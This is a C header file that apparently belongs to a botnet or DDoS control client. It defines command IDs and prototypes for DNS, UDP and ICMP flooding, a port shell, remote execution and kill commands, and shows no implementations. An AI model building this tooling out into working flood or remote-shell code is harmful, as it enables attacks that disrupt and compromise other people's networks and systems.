#define ID_STATUS 1
#define ID_SETADDR 2
#define ID_COMMAND 3
#define ID_DNSSWARM 4
#define ID_DATAGRAMFLOOD 5
#define ID_PORTSHELL 6
#define ID_EXECUTE 7
#define ID_KILL 8
#define ID_DNSFLOOD 12

#define TIMEOUT_SECONDS = 5
typedef struct { 
	char *name;
	void (*handler)(char *);
} command_t;

char *next_command(char **arg);
void copy_ip(unsigned ip, char *buf);
char *receive_data(int *recv_len);
int encode_and_send(int command_id, char *buffer, int buffer_len);

int get_status(void);
void do_stat(char *arg);
void do_quit(char *arg);
void do_command(char *arg);
void do_run(char *arg);
void do_help(char *arg);
void do_setaddr(char *arg);
void do_portshell(char *arg);
void do_kill(char *arg);
void do_dnsflood(char *target);
void do_dnsswarm(char *target);
void do_udpflood(char *target);
void do_icmpflood(char *target);


void datagram_flood(char *target, int type);

